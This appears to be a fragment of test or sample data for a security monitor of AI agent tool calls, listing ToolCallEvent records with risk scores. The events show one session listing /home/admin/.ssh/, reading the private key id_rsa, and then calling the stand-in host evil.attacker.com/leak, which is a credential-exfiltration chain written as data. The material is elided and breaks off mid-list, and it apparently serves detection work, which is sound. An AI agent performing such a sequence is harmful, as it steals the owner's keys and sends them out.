...
events = [
    ...
    ToolCallEvent(
        ...
        tool_server="file-server",
        parameters={"path": "/home/admin/.ssh/"},
        risk_score=0.35,
    ),
    ToolCallEvent(
        session_id="sess-c44d",
        ...
        tool_name="read_file",
        tool_server="file-server",
        parameters={"path": "/home/admin/.ssh/id_rsa"},
        response_size_bytes=3200,
        risk_score=0.55,
    ),
    ToolCallEvent(
        session_id="sess-c44d",
    ...
    ToolCallEvent(
        ...
        parameters={"url": "https://evil.attacker.com/leak"},
